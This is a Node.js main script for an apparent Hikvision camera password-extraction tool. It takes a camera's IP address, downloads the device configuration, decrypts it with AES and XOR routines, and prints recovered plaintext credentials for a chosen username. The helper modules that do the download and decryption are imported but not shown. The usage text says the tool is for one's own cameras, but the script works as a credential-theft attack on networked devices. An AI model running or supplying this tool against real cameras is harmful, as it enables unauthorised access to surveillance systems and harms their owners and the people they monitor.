import downloadConfig from "./downloadConfig.js";
import decryptFile from "./decryptAes.js";
import decryptXor from "./decryptXor.js";
import findAuth from "./findAuth.js";

const main = async () => {
  const ipAddress = process.argv[2];
  const username = process.argv[3] || "admin";
  const DEBUG =
    process.env.DEBUG === "true" || process.argv.includes("--debug");

  if (!ipAddress) {
    console.log(
      "Please provide the IP address of one of your Hikvision cameras!"
    );
    console.log("Usage: node index.js <IP_ADDRESS> [username]");
    console.log("       node index.js <IP_ADDRESS> [username] --debug");
    console.log("   or: DEBUG=true node index.js <IP_ADDRESS> [username]");
    process.exit(1);
  }

  try {
    console.log(`Starting password extraction for ${ipAddress}...`);

    const configPath = await downloadConfig(ipAddress);
    console.log("✓ Configuration downloaded successfully");

    console.log("Decrypting file...");
    const decryptedPath = await decryptFile(configPath);
    console.log("✓ File decrypted successfully");

    console.log("Decoding file...");
    const decodedPath = await decryptXor(decryptedPath);
    console.log("✓ File decoded successfully");

    console.log("Finding passwords...");
    const resultArr = await findAuth(decodedPath, username);

    console.log(`\n🔐 Passwords Located: ${resultArr.length}`);
    console.log("---------------------------------------------------");

    if (resultArr.length === 0) {
      console.log("No passwords found for the specified username.");
    } else {
      resultArr.forEach((item, index) => {
        console.log(`Password ${index + 1}:`);
        console.log(`  Username: ${username}`);
        // Extract password from different possible positions in the match array
        const password = item[2] || item[1] || "Not found";
        console.log(`  Password: ${password}`);
        if (DEBUG) {
          console.log(`  Full match: ${item[0]}`);
        }
        console.log("");
      });
    }

    console.log("✓ Password extraction completed successfully!");
  } catch (err) {
    console.error("❌ An error occurred:", err.message);
    console.error("Stack trace:", err.stack);
    process.exit(1);
  }
};

main();
